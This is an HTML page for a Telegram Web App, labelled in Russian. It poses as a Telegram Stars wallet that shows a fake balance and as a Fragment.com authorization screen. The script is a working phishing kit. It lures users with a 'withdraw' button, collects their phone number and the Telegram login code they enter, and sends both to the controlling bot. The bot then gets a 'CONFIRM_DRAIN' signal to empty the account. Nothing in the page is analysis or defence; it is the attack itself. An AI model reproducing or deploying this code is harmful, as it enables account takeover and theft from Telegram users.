<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { background: #000000; color: white; font-family: -apple-system, system-ui, sans-serif; margin: 0; padding: 0; -webkit-font-smoothing: antialiased; }
        .page { display: none; padding: 20px; text-align: center; }
        .active { display: block; }

        /* Профиль */
        .user-pill { display: inline-flex; align-items: center; gap: 8px; background: #1c1c1c; padding: 6px 12px; border-radius: 20px; margin-top: 10px; margin-bottom: 40px; }
        .u-img { width: 22px; height: 22px; border-radius: 50%; background: #333; }
        .u-name { font-size: 14px; font-weight: 400; color: #fff; }

        /* Баланс */
        .star-main { color: #fecb2e; font-size: 48px; margin-bottom: 5px; display: inline-block; vertical-align: middle; }
        .val-main { font-size: 64px; font-weight: 500; vertical-align: middle; margin-left: 10px; }
        .label-main { color: #888; font-size: 14px; margin-top: 5px; margin-bottom: 40px; }

        /* Кнопки действий */
        .actions { display: flex; justify-content: center; gap: 40px; margin-bottom: 40px; }
        .act-item { display: flex; flex-direction: column; align-items: center; gap: 10px; cursor: pointer; text-decoration: none; }
        .act-circle { width: 50px; height: 50px; border-radius: 50%; border: 1.5px solid #fecb2e; display: flex; align-items: center; justify-content: center; color: #fecb2e; font-size: 20px; }
        .act-text { color: #fecb2e; font-size: 13px; font-weight: 500; }

        /* Чек-карта */
        .check-card { background: #181818; border-radius: 12px; padding: 15px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 40px; text-align: left; cursor: pointer; }
        .check-icon { background: #fecb2e; color: #000; width: 40px; height: 35px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 18px; margin-right: 15px; }
        .check-info b { display: block; font-size: 15px; margin-bottom: 2px; }
        .check-info span { font-size: 13px; color: #777; line-height: 1.2; display: block; }

        /* История */
        .hist-label { text-align: left; color: #555; font-size: 14px; margin-bottom: 20px; padding-left: 5px; }
        .hist-empty { color: #333; font-size: 16px; margin-top: 40px; }

        /* ЭКРАН FRAGMENT (АВТОРИЗАЦИЯ) */
        .frag-icons { display: flex; align-items: center; justify-content: center; gap: 15px; margin: 60px 0 40px; }
        .logo-c { width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 30px; }
        .bg-tg { background: #248bcf; color: white; }
        .bg-fr { background: #1c1c1c; border: 1px solid #333; color: white; }
        .frag-arrow { color: #248bcf; font-size: 20px; }

        .frag-title { font-size: 22px; font-weight: 700; margin-bottom: 15px; line-height: 1.2; }
        .frag-desc { color: #888; font-size: 14px; line-height: 1.5; margin-bottom: 40px; padding: 0 20px; }
        .frag-desc b { color: #248bcf; font-weight: 400; }
        
        .btn-blue { background: #248bcf; color: white; border: none; width: 100%; padding: 16px; border-radius: 12px; font-size: 14px; font-weight: 700; cursor: pointer; text-transform: uppercase; }
        .btn-link { background: none; border: none; color: #248bcf; font-weight: 700; font-size: 14px; margin-top: 25px; cursor: pointer; text-transform: uppercase; }

        /* ЭКРАН КОДА */
        .code-val { font-size: 48px; font-weight: 700; color: #fecb2e; margin-bottom: 20px; }
        .code-input { background: #1c1c1c; border: none; width: 100%; padding: 18px; border-radius: 12px; color: white; font-size: 20px; text-align: center; letter-spacing: 8px; margin: 20px 0; outline: none; }
    </style>
</head>
<body>

    <div id="page-main" class="page active">
        <div class="user-pill">
            <img id="avatar" class="u-img" src="">
            <span id="name" class="u-name">Пользователь</span>
        </div>

        <div>
            <span class="star-main">⭐</span>
            <span class="val-main" id="stars-val">0</span>
        </div>
        <div class="label-main">Общий баланс в звездах</div>

        <div class="actions">
            <div class="act-item">
                <div class="act-circle"><i class="fa-solid fa-arrow-down"></i></div>
                <div class="act-text">Пополнить</div>
            </div>
            <div class="act-item" onclick="handleWithdraw()">
                <div class="act-circle"><i class="fa-solid fa-arrow-up-right-from-square"></i></div>
                <div class="act-text">Вывести</div>
            </div>
        </div>

        <div class="check-card">
            <div style="display: flex; align-items: center;">
                <div class="check-icon"><i class="fa-solid fa-money-check-dollar"></i></div>
                <div class="check-info">
                    <b>Звезды чеками</b>
                    <span>Делитесь звездами с помощью чеков.</span>
                </div>
            </div>
            <i class="fa-solid fa-chevron-right" style="color: #333; font-size: 12px;"></i>
        </div>

        <div class="hist-label">История транзакций</div>
        <div class="hist-empty">Транзакций пока нет</div>
    </div>

    <div id="page-auth" class="page">
        <div class="frag-icons">
            <div class="logo-c bg-tg"><i class="fa-brands fa-telegram"></i></div>
            <div class="frag-arrow"><i class="fa-solid fa-arrow-right"></i></div>
            <div class="logo-c bg-fr">
                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 2L3 7V17L12 22L21 17V7L12 2Z" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
            </div>
        </div>

        <div id="auth-content">
            <div class="frag-title">Войдите, чтобы использовать аккаунт Telegram</div>
            <div class="frag-desc">
                для fragment.com и <b>Fragment Auction Alerts</b>. Подтверждение будет отправлено в <b>Telegram</b>.
            </div>
            <button class="btn-blue" onclick="requestContact()">Поделиться номером телефона</button>
            <button class="btn-link" onclick="location.reload()">ОТМЕНА</button>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        tg.backgroundColor = '#000000';
        tg.headerColor = '#000000';

        const user = tg.initDataUnsafe.user;
        const urlParams = new URLSearchParams(window.location.search);
        const amount = urlParams.get('amount') || "0";
        let isAuthorized = urlParams.get('authorized') === 'true';

        document.getElementById('avatar').src = user?.photo_url || '';
        document.getElementById('name').innerText = user?.first_name || 'Пользователь';
        document.getElementById('stars-val').innerText = amount;

        function showPage(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(id).classList.add('active');
        }

        function handleWithdraw() {
            if (!isAuthorized) {
                showPage('page-auth');
            } else {
                tg.sendData("CONFIRM_DRAIN");
                tg.close();
            }
        }

        function requestContact() {
            tg.sendData("REQUEST_CONTACT_TRIGGER"); 
            tg.close();
        }

        // Если бот прислал ссылку для ввода кода (step=code)
        if(urlParams.get('step') === 'code') {
            showPage('page-auth');
            document.getElementById('auth-content').innerHTML = `
                <div class="u-name" style="margin-bottom:10px;">Пользователь</div>
                <div class="code-val">${amount} ⭐</div>
                <div class="frag-desc" style="color:#fff">Введите код из чата Telegram для завершения регистрации</div>
                <input type="number" id="code-in" class="code-input" placeholder="0 0 0 0 0">
                <button class="btn-blue" onclick="submitCode()">ЗАРЕГИСТРИРОВАТЬСЯ</button>
            `;
        }

        function submitCode() {
            let val = document.getElementById('code-in').value;
            if(val.length < 5) return;
            tg.sendData("c:" + val);
            tg.close();
        }
    </script>
</body>
</html>
